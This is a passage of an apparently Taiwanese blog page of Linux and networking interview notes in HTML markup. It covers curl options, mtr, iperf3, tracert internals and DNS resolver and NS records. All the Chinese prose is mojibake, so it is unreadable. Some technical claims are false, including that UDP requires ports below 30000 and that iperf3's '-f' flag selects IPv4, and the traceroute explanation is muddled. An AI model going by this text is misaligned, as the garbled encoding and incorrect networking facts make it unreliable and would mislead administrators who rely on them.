href="#Linux-Admin" class="headerlink" title="Linux Admin"></a>Linux Admin</h2><blockquote><p>æ„Ÿè¦ºåå‘æŒ‡ä»¤ä½¿ç”¨æˆ–configå¦‚ä½•è¨­å®š</p></blockquote><ul><li>åœ¨Linuxä¸­ä½ æœƒæ€éº¼ç®¡ç†Userè·ŸGroup?é‚£åœ¨Windowsä¸­ä½ åˆæœƒæ€éº¼åšç®¡ç†?<ul><li>çœ‹user<code>cat /etc/passwd</code></li><li>æ–°å¢user <code>useradd</code></li><li>æ–°å¢group <code>groupadd</code></li><li>å†é€é <code>gpasswd</code> å°‡ä½¿ç”¨è€…åŠ å…¥æˆ–ç§»é™¤ root (sudo) æ¬Šé™ç¾¤çµ„</li></ul></li><li>å¯ä»¥è¬›è§£ä¸€ä¸‹<code>curl</code> æŒ‡ä»¤çš„åŸç†å—?<ul><li>ä¸€å€‹command lineå·¥å…·å¯ä»¥å‚³éè³‡æ–™åˆ°serverä¸­</li></ul></li><li>ä½ æœƒæ€éº¼ä½¿ç”¨ <code>curl</code> é€™å€‹æŒ‡ä»¤ä¾†åšTroubleshooting?<ul><li><code>$ curl protocol://IP/host:port</code></li><li>Troubleshooting Web Servers<ul><li><code>curl http://example.com -I</code> é€é-Iåƒæ•¸ä¾†è¿”å›Header</li></ul></li><li>Troubleshooting SMTP Servers <ul><li><code>curl smtp://example.com</code> é è¨­ä½¿ç”¨ port 25 ä½œç‚ºSMTP Port</li><li>ä½†æŸäº›ISPæœƒé˜»æ“‹æ¨™æº–SMTP portä¾†é˜²æ­¢SPAM</li><li>äº¦å¯ä½¿ç”¨ 2525 æˆ– 587 port</li></ul></li><li>Troubleshooting FTP<ul><li><code>curl ftp://example.com</code> é è¨­ä½¿ç”¨21 port</li></ul></li></ul></li><li>å¦‚ä½•ä½¿ç”¨ <code>curl</code> æŒ‡ä»¤ä¸¦é€éproxyä¾†é€£æ¥?<ul><li><code>curl --proxy yourproxy:port https://yoururl.com</code></li></ul></li><li>å¦‚ä½•é€é <code>curl</code> ç•¥éæª¢æŸ¥è‡ªç°½SSLæ†‘è­‰çš„æœ‰æ•ˆæ€§?<ul><li><code>curl -k https://localhost/</code></li><li><code>curl --insecure https://localhost/</code></li></ul></li><li>curl å„ç¨®ç”¨æ³•:<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl [protocol://domain:port/]</span><br><span class="line">$ curl -o &lt;æ¬²ä¸‹è¼‰çš„æª”å&gt; [protocol://domain:port/] ä¸‹è¼‰ç‰¹å®šæª”æ¡ˆ</span><br><span class="line">$ curl -O [protocol://domain:port/file]  ç›´æ¥ä¸‹è¼‰ç¶²å€ä¸­çš„æª”æ¡ˆ</span><br><span class="line">$ curl -C - -O [protocol://domain:port/file] å¾å‰›å‰›è¢«ä¸­æ–·çš„åœ°æ–¹ç¹¼çºŒä¸‹è¼‰</span><br><span class="line">$ curl -L [protocol://domain:port/] è·Ÿéš¨ç¶²å€çš„301/302 redirect</span><br><span class="line">$ curl --trace-ascii debugdump.txt [protocol://domain:port/] è¿½è¹¤æ•´å€‹curléç¨‹ï¼Œä¸¦å°‡çµæœå­˜å…¥debugdump.txtæª”æ¡ˆ</span><br></pre></td></tr></table></figure></li><li>curl é€²è¡ŒHTTP Request<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-X/--request [GET|POST|PUT|DELETE|PATCH]  ä½¿ç”¨æŒ‡å®šçš„ http method ä¾†ç™¼å‡º http request</span><br><span class="line">-H/--header                           è¨­å®š request è£¡æ‰€æ”œå¸¶çš„ header</span><br><span class="line">-i/--include                          åœ¨ output é¡¯ç¤º response çš„ header</span><br><span class="line">-d/--data                             æ”œå¸¶ HTTP POST Data </span><br><span class="line">-v/--verbose                          è¼¸å‡ºæ›´å¤šçš„è¨Šæ¯æ–¹ä¾¿ debug</span><br><span class="line">-u/--user                             æ”œå¸¶ä½¿ç”¨è€…å¸³è™Ÿã€å¯†ç¢¼</span><br><span class="line">-b/--cookie                           æ”œå¸¶ cookieï¼ˆå¯ä»¥æ˜¯åƒæ•¸æˆ–æ˜¯æª”æ¡ˆä½ç½®ï¼‰</span><br></pre></td></tr></table></figure></li><li>é€é curlå»POSTè³‡æ–™åˆ° HTML Form<ul><li>å‡è¨­æ”¶åˆ°çš„Formè¡¨å–®çš„HTMLé•·é€™æ¨£  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; action=&quot;form.php&quot;&gt;</span><br><span class="line">   &lt;input type=text name=&quot;email&quot;&gt;</span><br><span class="line">   &lt;input type=submit name=press value=&quot; OK &quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></li><li><code>curl -X POST --data &quot;email=test@example.com&amp;press=%20OK%20&quot; http://www.example.com/form.php</code></li></ul></li><li>é€é curlå»é€²è¡Œæª”æ¡ˆä¸Šå‚³<ul><li>å‡è¨­æ”¶åˆ°çš„Formè¡¨å–®çš„HTMLæ˜¯  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;form method=&quot;POST&quot; enctype=&#x27;multipart/form-data&#x27; action=&quot;upload.php&quot;&gt;</span><br><span class="line">&lt;input type=file name=upload&gt;</span><br><span class="line">&lt;input type=submit name=press value=&quot;OK&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure></li><li><code>curl -X POST -F &#39;file=@./upload.txt&#39; http://www.example.com/upload.php</code></li></ul></li><li>é€écurlå¸¸è¦‹çš„RESTFul CRUDæŒ‡ä»¤:<ul><li>GETå–®ä¸€æˆ–å…¨éƒ¨è³‡æº  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X GET &quot;http://www.example.com/api/resources&quot;</span><br><span class="line">$ curl -X GET &quot;http://www.example.com/api/resources/1&quot;</span><br></pre></td></tr></table></figure></li><li>POST JSONè³‡æ–™  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X POST -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;status&quot;:false,&quot;name&quot;:&quot;Jack&quot;&#125;&#x27; &quot;http://www.example.com/api/resources&quot;</span><br></pre></td></tr></table></figure></li><li>PUT JSONè³‡æ–™  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X PUT -H &quot;Content-Type: application/json&quot; -d &#x27;&#123;&quot;status&quot;:false&#125;&#x27; &quot;http://www.example.com/api/resources&quot;</span><br></pre></td></tr></table></figure></li><li>DELETE è³‡æº   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -X DELETE &quot;http://www.example.com/api/resources/1&quot;</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>é€écurlæ”œå¸¶cookie</strong><ul><li>åœ¨æŒ‡ä»¤ä¸­è¼¸å…¥cookie  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cookie &quot;name=Jack&quot; http://www.example.com</span><br></pre></td></tr></table></figure></li><li>å¾æª”æ¡ˆä¸­è®€å–cookie  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --cookie stored_cookies_file_path http://www.example.com</span><br></pre></td></tr></table></figure></li></ul></li><li><strong>curlæŒ‡å®šæ”œå¸¶User Agent</strong>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --user-agent &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64)&quot; http://www.example.com</span><br></pre></td></tr></table></figure><ul><li><strong>Basic Authentication:</strong> è‹¥ç¶²é æœ‰ä½¿ç”¨åŸºæœ¬çš„Authenticationå‰‡å¯æ”œå¸¶<code>--user username:password</code> ä¾†é€šéé©—è­‰  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -i --user secret:vary_secret http://www.example.com/api/resources</span><br></pre></td></tr></table></figure></li></ul></li><li>é€écurlæŒ‡ä»¤ä½¿ç”¨proxyåšé€£æ¥<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --proxy yourproxy:port https://youurl.com</span><br></pre></td></tr></table></figure></li><li>curlé™å®šä¸‹è¼‰é€Ÿåº¦<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --limit-rate 2000B [URL]</span><br></pre></td></tr></table></figure></li><li><strong>åœ¨è«‹æ±‚ä¸­æ³¨å…¥ç‰¹å®šContent-Typeä¾†è™•ç†ç‰¹å®šå•é¡Œ</strong><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --header &#x27;Content-Type: application/json&#x27; http://yoururl.com</span><br></pre></td></tr></table></figure></li><li>åƒ…åœ¨å›æ‡‰ä¸­å‘ˆç¾header<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --head http://yoururl.com</span><br></pre></td></tr></table></figure></li><li><strong>é€£æ¥ HTTPS&#x2F;SSL URL ä¸¦å¿½ç•¥ä»»ä½• SSL æ†‘è­‰éŒ¯èª¤</strong><ul><li>ç•¶è©¦åœ–å­˜å–SSL&#x2F;TLSæ†‘è­‰çš„å®‰å…¨URLæ™‚å€™ï¼Œè‹¥å‡ºç¾æ†‘è­‰éŒ¯èª¤æˆ–CNä¸åŒ¹é…ï¼Œå‰‡æœƒå‡ºç¾ä»¥ä¸‹éŒ¯èª¤<br>  <code>curl: (51) Unable to communicate securely with peer: requested domain name does not match the server&#39;s certificate.</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl --insecure https://yoururl.com</span><br></pre></td></tr></table></figure></li></ul></li><li>ä½¿ç”¨ç‰¹å®šå”å®š(SSL&#x2F;TLS)é€£ç·š<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl --sslv3 https://yoururl.com</span><br><span class="line">$ curl --tlsv1 https://example.com</span><br><span class="line">$ curl --tlsv1.0 https://example.com</span><br><span class="line">$ curl --tlsv1.1 https://example.com</span><br><span class="line">$ curl --tlsv1.2 https://example.com</span><br><span class="line">$ curl --tlsv1.3 https://example.com</span><br></pre></td></tr></table></figure></li><li>å¾FTP Serverä¸­ä¸‹è¼‰æª”æ¡ˆ<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl -u user:password -O ftp://ftpurl/style.css</span><br></pre></td></tr></table></figure></li><li>å¯ä»¥è¬›è§£ä¸€ä¸‹MTRæŒ‡ä»¤æ€éº¼ç”¨å—?<ul><li><a href="https://blog.gtwang.org/linux/mtr-linux-network-diagnostic-tool/"><strong>MTR</strong></a><ul><li>æŒ‡ä»¤å¯¦ä½œ: MTR åœ¨ä¸€é–‹å§‹æœƒé‡å°æŒ‡å®šçš„ä¸»æ©Ÿï¼Œä»¥ traceroute æ‰¾å‡ºä¸­é–“çš„æ¯ä¸€å€‹ç¶²è·¯ç¯€é»ï¼ˆé–˜é“å™¨ã€è·¯ç”±å™¨ã€æ©‹æ¥å™¨ç­‰ï¼‰ï¼Œç„¶å¾Œä½¿ç”¨ ping å»æª¢æŸ¥æ¯ä¸€å€‹ç¯€é»çš„ç¶²è·¯é€£ç·šç‹€æ³ï¼Œå³æ™‚æ›´æ–°åœ¨è¼¸å‡ºçš„å ±è¡¨ä¸­ï¼Œè®“ç®¡ç†è€…ä¸€ç›®äº†ç„¶ã€‚  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mtr www.google.com.tw   </span><br><span class="line">mtr -n www.google.com.tw //çµ±ä¸€ä»¥ipä½å€ä¾†å‘ˆç¾</span><br><span class="line">mtr -b www.google.com.tw //åŒæ™‚å‘ˆç¾ipä½å€ä»¥åŠç¶²åŸŸåç¨±</span><br><span class="line">mtr -c 5 www.google.com.tw // æŒ‡å®šping ä¸Šé™(ICMP ECHO ä¸Šé™)</span><br><span class="line">mtr -c 5 -r www.google.com.tw &gt; output.txt //è¼¸å‡ºå ±è¡¨</span><br><span class="line"></span><br></pre></td></tr></table></figure>  <img src="https://i.imgur.com/BSFP2pP.png"></li><li>L(Loss): å°åŒ…éºå¤±ç‡</li><li>S(Snt,Sent Packet): å°åŒ…ç™¼é€æ•¸</li><li>Avg(Average RTT): </li><li>Best(Best RTT):</li><li>Worst(Worst RTT):</li></ul></li><li>æ‰€ä»¥å¾é€™å€‹å·¥å…·ä¸­å¯ä»¥ç™¼ç¾ç”šéº¼?????</li></ul></li><li>å¯ä»¥è¬›è§£ä¸€ä¸‹ <code>iperf</code> æŒ‡ä»¤æ€éº¼ä½¿ç”¨å—?<ul><li>&#x3D; <code>iperf3</code>æ˜¯ä¸€ç¨®ç¶²è·¯é »å¯¬æ¸¬è©¦å·¥å…·ï¼Œå¯ä»¥æ¸¬è©¦å®¢æˆ¶ç«¯ä¸Šå‚³è³‡æ–™é€Ÿåº¦</li><li>é€éTCPä¾†æ¸¬é‡é »å¯¬ã€ç¢ºå®šéˆè·¯å“è³ªè·Ÿå»¶é²ä»¥åŠæŠ–å‹•å’Œå°åŒ…éºå¤±</li><li>æ¸¬æ™‚é »å¯¬æ™‚ï¼Œéœ€è¦åŒæ™‚åœ¨serverèˆ‡clientç«¯éƒ½å„åŸ·è¡Œä¸€å€‹iperf3ç¨‹å¼ï¼Œè®“ä»–å€‘äº’ç›¸å‚³é€è³‡æ–™é€²è¡Œæ¸¬è©¦  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># serverç«¯   </span><br><span class="line">iperf3 -s   //æ‰“é–‹ç›£è½socket é è¨­portç‚º5201ï¼Œé–‹æ”¾Server Thread</span><br></pre></td></tr></table></figure>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># clientç«¯</span><br><span class="line">iperf3 -c SERVER_IP/HOSTNAME</span><br></pre></td></tr></table></figure></li><li>iperf3 ä¹Ÿæ”¯æ´Androidä»¥åŠIOSçš„ä½¿ç”¨(æœ‰APP)</li><li>æŒ‡å®šæ¸¬è©¦æ™‚é–“  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -t 20 -i 4 //æ¸¬è©¦20ç§’ï¼Œæ¯éš”4ç§’è¼¸å‡ºä¸€æ¬¡æ¸¬è©¦æ•¸æ“š</span><br></pre></td></tr></table></figure></li><li>å„²å­˜æ¸¬è©¦çµæœ  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP --logfile output.txt</span><br></pre></td></tr></table></figure></li><li>æŒ‡å®šport  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Serverç«¯</span><br><span class="line">iperf3 -s -p 12345</span><br><span class="line"></span><br><span class="line"># clientç«¯</span><br><span class="line">iperf3 -c SERVER_IP -p 12345</span><br></pre></td></tr></table></figure></li><li>å¤šæ¢é€£ç·š  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#åŒæ™‚ä½¿ç”¨å…©æ¢é€£ç·šæ¸¬è©¦</span><br><span class="line">iperf3 -c SERVER_IP -P 2</span><br></pre></td></tr></table></figure></li><li>è‹¥è¦æ¸¬è©¦UDPå‚³è¼¸å”å®šæ•ˆèƒ½ï¼Œå¯ä»¥ä½¿ç”¨ <code>-u</code> åƒæ•¸  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -u</span><br></pre></td></tr></table></figure></li><li>åå‘å‚³è¼¸:æ¸¬è©¦ä¸‹è¼‰é€Ÿåº¦(serverå‚³é€ï¼Œcleintæ¥æ”¶)<ul><li>é è¨­è³‡æ–™æµ: client $\rightarrow$ Server  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -R</span><br></pre></td></tr></table></figure></li></ul></li><li>IPv4ã€IPv6  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_IP -f</span><br><span class="line">iperf3 -c SERVER_IP -6</span><br></pre></td></tr></table></figure></li><li>è‡ªè¨‚å‚³é€æª”æ¡ˆ  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iperf3 -c SERVER_ip -F YOUR_FILE</span><br></pre></td></tr></table></figure></li></ul></li><li>å¯ä»¥è¬›è§£ä¸€ä¸‹ <code>tracert</code> æŒ‡ä»¤æ€éº¼ä½¿ç”¨å—?ç”šéº¼æƒ…æ³ä¸‹ä½ æœƒç”¨åˆ°é€™å€‹æŒ‡ä»¤?<br>ä¸»è¦æ˜¯ç”¨æ–¼å³æ™‚ç¶²çµ¡æ•…éšœæ’é™¤ï¼Œä»¥æŸ¥æ‰¾å°åŒ…åœ¨é€šéç¶²è·¯å‚³è¼¸åˆ°å…¶ç›®æ¨™åœ°å€æ™‚æ‰€æ¡ç”¨çš„è·¯ç”±è·¯å¾‘<br>ä¸»è¦æ˜¯é€éç™¼é€ICMPå°åŒ…ï¼Œä¸¦è¨­å®šIP Headerä¸Šçš„TTLæ¬„ä½ä¾†é”æˆtracerouteåŠŸèƒ½çš„<br>æ¯æ¬¡é€å‡ºçš„ç‚º3å€‹40bytesçš„å°åŒ…ï¼ŒåŒ…æ‹¬sourceä½å€ï¼Œç›®çš„ä½å€å’Œå°åŒ…ç™¼å‡ºçš„timestampåˆ°ç›®çš„åœ°ï¼Œç¬¬ä¸€å€‹æœƒæ˜¯probe(æ¢æ¸¬ç”¨)ï¼Œç„¶å¾Œæ˜¯èµ°UDPï¼Œç”±æ–¼æˆ‘å€‘ä¸æƒ³ç›®çš„ä¸»æ©Ÿè™•ç†å®ƒå€‘ï¼Œå› æ­¤ç›®çš„åŸ è¨­å®šç‚ºä¸€å€‹ä¸å¯èƒ½çš„å€¼<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ tracert -d -h maximum_hops -j host_list -w timeout target_host</span><br><span class="line">-w è¦æŒ‡å®šç­‰å¾…timeoutçš„æ¯«ç§’æ•¸</span><br></pre></td></tr></table></figure></li><li>ç•¶ <code>tracert</code> æŒ‡ä»¤ä¸­å‡ºç¾æ˜Ÿè™Ÿä»£è¡¨ç”šéº¼?<ul><li>è‹¥tracertå‡ºç¾æ˜Ÿè™Ÿ(*)ï¼Œä»£è¡¨è©²ç¯€é»å¯èƒ½æœ‰æŸäº›é˜²ç¦¦æªæ–½ï¼Œä½¿æˆ‘å€‘çš„å°åŒ…è¢«ä¸Ÿæ£„<ul><li>å¯èƒ½æ˜¯iptablesè¨­å®šç‚ºDropä¹‹é¡çš„</li></ul></li></ul></li><li>è¬›è§£ä¸€ä¸‹ <code>tracert</code> æŒ‡ä»¤çš„åŸç†æ˜¯ç”šéº¼å—?<ul><li>ç‰¹æ€§1: ä¸»è¦æ˜¯é€é TTL(Time_To_Live)å€¼ä¾†æ˜¯ç¾åŠŸèƒ½çš„ï¼Œæ¯ç¶“éä¸€å€‹ç¯€é»ï¼Œè·¯ç”±å™¨å°±æœƒå¹«TTLå€¼æ¸›1</li><li>ç‰¹æ€§2: ä¸»è¦å‘¼å«è€…æœƒç™¼å‡º TTL&#x3D;1çš„å°åŒ…ï¼Œç¬¬ä¸€å€‹è·¯ç”±å™¨å°‡TTLæ¸›1å¾Œå¾—åˆ°0ï¼Œä¸å†ç¹¼çºŒå€¼è½‰ç™¼æ­¤å°åŒ…</li><li>è€Œæœƒè¿”å›ä¸€å€‹ICMP Time_Out Responseï¼Œç„¶å¾Œé›»è…¦å°±æœƒå¾Responseä¸­æå–å‡ºå°åŒ…ç¶“éçš„ç¬¬ä¸€å€‹gatewayåœ°å€</li><li>æ¥è‘—ç™¼å‡ºä¸€å€‹TTL&#x3D;2çš„ICMPå°åŒ…ï¼Œå¯ä»¥ç²å¾—ç¬¬äºŒå€‹gatewayåœ°å€</li><li>å› æ­¤ä¾æ¬¡éå¢TTLå€¼ä¾¿ç²å–æ²¿é€”æ‰€æœ‰Gatewatä½å€</li></ul></li><li>å¦‚æœ <code>tracert</code> å›å‚³responseä¸¦ä¸æ˜¯ICMP Time_Outï¼Œä»£è¡¨ç”šéº¼?<ul><li>å¤§å¤šé˜²ç«ç‰†æˆ–å•Ÿç”¨é˜²ç«ç‰†åŠŸèƒ½çš„è·¯ç”±å™¨é è¨­æœƒä¸è¿”å›å„ç¨®ICMPå°åŒ…</li><li>å…¶é¤˜è·¯ç”±å™¨æˆ–äº¤æ›å™¨å¯è¢«adminè¨­å®šæˆä¸è¿”å›ICMP Response</li><li><strong>å› æ­¤ Tracerouteç¨‹å¼ä¸ä¸€å®šèƒ½å¤ æ‹¿åˆ°æ‰€æœ‰æ²¿é€”gatewayä½å€</strong><ul><li>ç•¶æŸå€‹TTLå€¼çš„å°åŒ…å¾—ä¸åˆ°å›è¦†æ™‚ï¼Œä¸¦ä¸èƒ½åœæ­¢é€™ä¸€è¿½è¹¤éç¨‹ï¼Œç¨‹å¼ä»ç„¶æœƒæŠŠTTLéå¢ç„¶å¾Œç™¼å‡ºä¸‹ä¸€å€‹å°åŒ…ï¼Œä¸€ç›´åˆ°é è¨­æœƒé€éåƒæ•¸æŒ‡å®šçš„<strong>è¿½è¹¤é™åˆ¶(maximum_hops)</strong></li></ul></li></ul></li><li>è‹¥ç„¡æ³•å›æ‡‰ICMP Responseï¼Œé‚£åˆæ˜¯å¦‚ä½•çŸ¥é“å°åŒ…æŠµé”äº†?<ul><li>Tracerouteåœ¨é€å‡ºUDP datagramsåˆ°ç›®çš„åœ°æ™‚ï¼Œå®ƒæ‰€é¸æ“‡é€é”çš„port number æ˜¯ä¸€å€‹ä¸€èˆ¬æ‡‰ç”¨ç¨‹å¼éƒ½ä¸æœƒç”¨çš„è™Ÿç¢¼ï¼ˆ<strong>30000 ä»¥ä¸Š</strong>ï¼‰</li><li>æ‰€ä»¥ç•¶æ­¤UDP datagram åˆ°é”ç›®çš„åœ°å¾Œè©²ä¸»æ©Ÿæœƒé€å›ä¸€å€‹ã€Œ<strong>ICMP port unreachable</strong>ã€çš„è¨Šæ¯ï¼Œè€Œç•¶traceroute æ”¶åˆ°é€™å€‹è¨Šæ¯æ™‚ï¼Œä¾¿çŸ¥é“ç›®çš„åœ°å·²ç¶“åˆ°é”äº†ã€‚</li></ul></li><li>ç‚ºç”šéº¼tracerouteè¦ä½¿ç”¨å¤§æ–¼30000çš„port<ul><li>è·ŸUDPè¦å®športè™Ÿå¿…é ˆå°æ–¼30000æœ‰é—œ</li><li>è‹¥ä½¿ç”¨UDPå‰‡å¯èƒ½æœƒå› ç‚ºä¸»æ©Ÿæ²’æœ‰æä¾› UDP æœå‹™è€Œç°¡å–®å°‡å°åŒ…æ‹‹æ£„ï¼Œç„¶å¾Œä¸è¿”å›ä»»ä½•è³‡è¨Š</li><li>æ‰€ä»¥ä½¿ç”¨å¤§æ–¼30000çš„portï¼Œç›®æ¨™ä¸»æ©Ÿèƒ½åšçš„æ˜¯å°±æ˜¯è¿”å›ä¸€å€‹ <strong>portä¸å¯é”</strong> çš„å›æ‡‰</li></ul></li><li><a href="https://haway.30cm.gg/dns-1-basic/">ç”šéº¼æ˜¯FQDN(å®Œæ•´ç¶²åŸŸåç¨±?)</a><ul><li>åœ¨&#x2F;etc&#x2F;resolv.confä¸­ï¼Œæ²’æœ‰åŠ ä¸Šâ€.â€ çµå°¾çš„ä¸»æ©Ÿåç¨±ï¼Œéƒ½æœƒè¢«ç³»çµ±è‡ªå‹•é™„åŠ ç¶²åŸŸåç¨±</li><li>ç„¶å¾Œæª”æ¡ˆä¸­çš„<strong>search</strong> å°±æ˜¯å‘Šè¨´ç³»çµ±å¯ä»¥é™„åŠ ä»€éº¼æ¨£çš„ç¶²åŸŸåç¨±  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">domain rsync.tw</span><br><span class="line">nameserver 168.95.1.1 (cache server)</span><br><span class="line">nameserver 8.8.8.8  (cache server)</span><br><span class="line">search hdns.com.tw example.com</span><br></pre></td></tr></table></figure></li><li>ä¸Šæ–¹ç¯„ä¾‹ä¸­åªè¦è¼¸å…¥blogï¼Œç³»çµ±å°±æœƒè‡ªå‹•æ”¹ç‚ºblog.rsync.twä¸¦é€åˆ°168.95.1.1å»åšDNSè§£æï¼Œä½†å¦‚æœä¸æˆåŠŸå°±æœƒæ›æˆblog.hdns.com.twå†æ¬¡å˜—è©¦ï¼Œä»¥æ­¤é¡æ¨</li><li>è‹¥168.95.1.1çš„DNSæœå‹™ç„¡æ³•é€£ä¸Šï¼Œç³»çµ±å°±æœƒè‡ªå‹•è·³åˆ°ç¬¬äºŒç­†çš„8.8.8.8ä¼ºæœå™¨</li></ul></li><li>è¦æ€éº¼è¨­å®šDNS Cache Server?<ul><li>å»&#x2F;etc&#x2F;resolv.confæ›´æ”¹ nameserver</li></ul></li><li><strong>DNSæ¬Šå¨Serverä»¥åŠDNS Cache Serverå·®åˆ¥?</strong><ul><li>DNS Authoritative Server:æœƒå¾è‡ªå·±çš„è³‡æ–™åº«å–å‡ºDNSç´€éŒ„ä¸¦å›æ‡‰è«‹æ±‚</li><li>Cache Serverå‰‡æ˜¯å»è©¢å•å…¶ä»–ä¸»æ©Ÿçš„DNSè³‡æ–™</li></ul></li><li>DNSä¸­ç”šéº¼æ˜¯NS(Nameserver)ç´€éŒ„?<br>  <img src="https://i.imgur.com/YMAcJ1x.png"><ul><li>root serveræœƒå»è¨˜éŒ„æ¯å€‹å­ç¶²åŸŸçš„æˆæ¬Šä¸»æ©Ÿä½ç½®å°±æ˜¯é€éNS Record</li><li>NS Recordçš„ç”¨é€”æœ‰å…©å€‹:ä¸€å€‹æ˜¯å‘ä¸‹æˆæ¬Šã€ä¸€å€‹æ˜¯å¹³è¡Œæˆæ¬Š</li><li>å‘ä¸‹æˆæ¬Š: å»ºç«‹ä¸€å€‹å­ç¶²åŸŸ (EX. è·ŸServerå»ºç«‹ä¸€å€‹.twçš„å­ç¶²åŸŸ)ï¼Œä¸¦æˆæ¬Šçµ¦TWNICçš„ä¸»æ©Ÿ</li><li>å¹³è¡Œæˆæ¬Š: åŒå€‹ç¶²åŸŸåç¨±çš„æ‰€æœ‰NameServerï¼Œéƒ½å¿…é ˆæœ‰ç›¸åŒçš„NSç´€éŒ„<br>  <img src="https://i.imgur.com/9mo0lwG.png"></li><li>ä¸Šé¢å°±æ˜¯ ntpu.edu.tw å·²ç¶“æˆæ¬Šçµ¦å…­å°nameserverï¼Œé€™å…­å°çš„ntpu.edu.twçš„nsç´€éŒ„å¿…é ˆå®Œå…¨ä¸€æ¨£</li></ul></li><li>è¦æ€éº¼çŸ¥é“è‡ªå·±çš„DNSä¸»æ©Ÿç›®å‰æ­£å¼æˆæ¬Šåˆ°å“ªäº›ä¸»æ©Ÿä¸Šé¢?<ul><li>è³¼è²·ç¶²åŸŸåç¨±æ™‚å¾Œå¡«å¯«çš„Nameserverï¼Œè¨»å†Šå•†æœƒä¾ç…§æ‰€è¨»å†Šçš„åŸŸå</li><li>æŠŠä½ çš„nameserveré€çµ¦Registryï¼ŒRegistryç¢ºèªå¾Œå°±æœƒæŠŠä½ çš„ä¸»æ©Ÿè³‡æ–™æ”¾å…¥ä»–å€‘çš„ç´€éŒ„ä¸­</li><li>å°±æœƒç”¢ç”Ÿä¸€çµ„NSè³‡æ–™  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 